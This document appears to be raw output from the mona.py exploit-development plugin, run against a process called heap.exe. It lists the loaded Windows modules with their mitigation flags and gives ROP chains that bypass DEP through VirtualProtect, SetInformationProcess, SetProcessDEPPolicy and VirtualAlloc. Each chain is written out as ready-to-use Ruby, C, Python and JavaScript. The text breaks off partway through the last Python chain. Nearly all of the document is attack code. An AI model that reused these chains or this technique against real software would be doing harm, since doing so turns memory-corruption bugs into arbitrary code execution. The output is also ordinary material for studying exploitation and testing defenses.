================================================================================
  Output generated by mona.py v2.0, rev 613 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : post2008server, release 6.2.9200
  Process being debugged : heap (pid 9908)
  Current mona arguments: rop -m *
================================================================================
  2020-08-17 14:29:34
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x00df0000 | 0x00e10000 | 0x00020000 | True   | True    | False |  False   | False  | -1.0- [heap.exe] (C:\Users\Administrator\heap.exe)
 0x76280000 | 0x7647b000 | 0x001fb000 | True   | True    | True  |  False   | True   | 10.0.17763.771 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
 0x75f80000 | 0x76060000 | 0x000e0000 | True   | True    | True  |  False   | True   | 10.0.17763.771 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
 0x77430000 | 0x775cc000 | 0x0019c000 | True   | True    | True  |  False   | True   | 10.0.17763.771 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x763a9277,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x760012f8,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x774776ae,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fed26d,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75fec28f,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x76438244,  # & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x75fb63d2,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x774a5dbf,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x77488746,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x76447440,  # &Writable location [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x774908c6,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fc9686,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75fe4f4c,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x762b58a8,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x763a9277,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x760012f8,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x774776ae,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fed26d,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x75fec28f,  // POP EBP // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x76438244,  // & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x75fb63d2,  // POP EBX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x774a5dbf,  // POP EDX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x77488746,  // POP ECX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x76447440,  // &Writable location [KERNELBASE.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x774908c6,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fc9686,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x75fe4f4c,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x762b58a8,  // PUSHAD // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x763a9277,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x760012f8,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x774776ae,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fed26d,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75fec28f,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x76438244,  # & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x75fb63d2,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x774a5dbf,  # POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x77488746,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x76447440,  # &Writable location [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x774908c6,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fc9686,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x75fe4f4c,  # POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x762b58a8,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u9277%u763a" + // 0x763a9277 : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%u12f8%u7600" + // 0x760012f8 : ,# ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "%u76ae%u7747" + // 0x774776ae : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%ud26d%u75fe" + // 0x75fed26d : ,# PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%uc28f%u75fe" + // 0x75fec28f : ,# POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u8244%u7643" + // 0x76438244 : ,# & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u63d2%u75fb" + // 0x75fb63d2 : ,# POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u5dbf%u774a" + // 0x774a5dbf : ,# POP EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u8746%u7748" + // 0x77488746 : ,# POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u7440%u7644" + // 0x76447440 : ,# &Writable location [KERNELBASE.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u08c6%u7749" + // 0x774908c6 : ,# POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u9686%u75fc" + // 0x75fc9686 : ,# RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u4f4c%u75fe" + // 0x75fe4f4c : ,# POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u58a8%u762b" + // 0x762b58a8 : ,# PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x763d1f2d,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x764493c0,  # ptr to &SetInformationProcess() [IAT KERNELBASE.dll] ** REBASED ** ASLR
      0x7744c4f0,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x00e02a68,  # POP EDX # RETN [heap.exe] ** REBASED 
      0x00000022,  # 0x00000022-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x7748c4e6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00df1d92,  # &0x00000002 [heap.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7642088f,  # POP EBX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x763a99a7,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x00000004,  # 0x00000004-> eax
      #[---INFO:gadgets_to_set_edi:---]
      0x774a79d8,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x774a79d8,  # skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x762c3d88,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x763d1f2d,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x764493c0,  // ptr to &SetInformationProcess() [IAT KERNELBASE.dll] ** REBASED ** ASLR
      0x7744c4f0,  // MOV EBP,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x00e02a68,  // POP EDX // RETN [heap.exe] ** REBASED 
      0x00000022,  // 0x00000022-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x7748c4e6,  // POP ECX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00df1d92,  // &0x00000002 [heap.exe]
      //[---INFO:gadgets_to_set_ebx:---]
      0x7642088f,  // POP EBX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x763a99a7,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x00000004,  // 0x00000004-> eax
      //[---INFO:gadgets_to_set_edi:---]
      0x774a79d8,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x774a79d8,  // skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:pushad:---]
      0x762c3d88,  // PUSHAD // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x763d1f2d,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x764493c0,  # ptr to &SetInformationProcess() [IAT KERNELBASE.dll] ** REBASED ** ASLR
      0x7744c4f0,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x00e02a68,  # POP EDX # RETN [heap.exe] ** REBASED 
      0x00000022,  # 0x00000022-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x7748c4e6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00df1d92,  # &0x00000002 [heap.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7642088f,  # POP EBX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x763a99a7,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x00000004,  # 0x00000004-> eax
      #[---INFO:gadgets_to_set_edi:---]
      0x774a79d8,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x774a79d8,  # skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x762c3d88,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u1f2d%u763d" + // 0x763d1f2d : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%u93c0%u7644" + // 0x764493c0 : ,# ptr to &SetInformationProcess() [IAT KERNELBASE.dll] ** REBASED ** ASLR
    "%uc4f0%u7744" + // 0x7744c4f0 : ,# MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u2a68%u00e0" + // 0x00e02a68 : ,# POP EDX # RETN [heap.exe] ** REBASED 
    "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%uc4e6%u7748" + // 0x7748c4e6 : ,# POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u1d92%u00df" + // 0x00df1d92 : ,# &0x00000002 [heap.exe]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u088f%u7642" + // 0x7642088f : ,# POP EBX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u99a7%u763a" + // 0x763a99a7 : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u79d8%u774a" + // 0x774a79d8 : ,# POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u79d8%u774a" + // 0x774a79d8 : ,# skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
    "" + // #[---INFO:pushad:---] : 
    "%u3d88%u762c" + // 0x762c3d88 : ,# PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x75fea964,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75fb5bf0,  # SetProcessDEPPolicy() [KERNEL32.DLL]
      #[---INFO:gadgets_to_set_ebx:---]
      0x75fcc160,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00df0011,  # &0x00000000 [heap.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x774a76a8,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x774a76a8,  # skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x7744a3c9,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x75fea964,  // POP EBP // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75fb5bf0,  // SetProcessDEPPolicy() [KERNEL32.DLL]
      //[---INFO:gadgets_to_set_ebx:---]
      0x75fcc160,  // POP EBX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00df0011,  // &0x00000000 [heap.exe]
      //[---INFO:gadgets_to_set_edi:---]
      0x774a76a8,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x774a76a8,  // skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:pushad:---]
      0x7744a3c9,  // PUSHAD // RETN [ntdll.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x75fea964,  # POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x75fb5bf0,  # SetProcessDEPPolicy() [KERNEL32.DLL]
      #[---INFO:gadgets_to_set_ebx:---]
      0x75fcc160,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x00df0011,  # &0x00000000 [heap.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x774a76a8,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x774a76a8,  # skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:pushad:---]
      0x7744a3c9,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ua964%u75fe" + // 0x75fea964 : ,# POP EBP # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u5bf0%u75fb" + // 0x75fb5bf0 : ,# SetProcessDEPPolicy() [KERNEL32.DLL]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%uc160%u75fc" + // 0x75fcc160 : ,# POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "%u0011%u00df" + // 0x00df0011 : ,# &0x00000000 [heap.exe]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u76a8%u774a" + // 0x774a76a8 : ,# POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u76a8%u774a" + // 0x774a76a8 : ,# skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
    "" + // #[---INFO:pushad:---] : 
    "%ua3c9%u7744" + // 0x7744a3c9 : ,# PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x763f80c7,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x760012fc,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x76367cea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x75fed26d,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x7749caba,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x763b5515,  # & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7747dfab,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00e02a63,  # POP EDX # RETN [heap.exe] ** REBASED 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00e012db,  # POP ECX # RETN [heap.exe] ** REBASED 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x774a79d8,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fc9686,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x763f80cb,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x762c3d88,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x763f80c7,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x760012fc,  // ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x76367cea,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x75fed26d,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x7749caba,  // POP EBP // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x763b5515,  // & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x7747dfab,  // POP EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x00e02a63,  // POP EDX // RETN [heap.exe] ** REBASED 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x00e012db,  // POP ECX // RETN [heap.exe] ** REBASED 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x774a79d8,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fc9686,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x763f80cb,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x762c3d88,  // PUSHAD // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
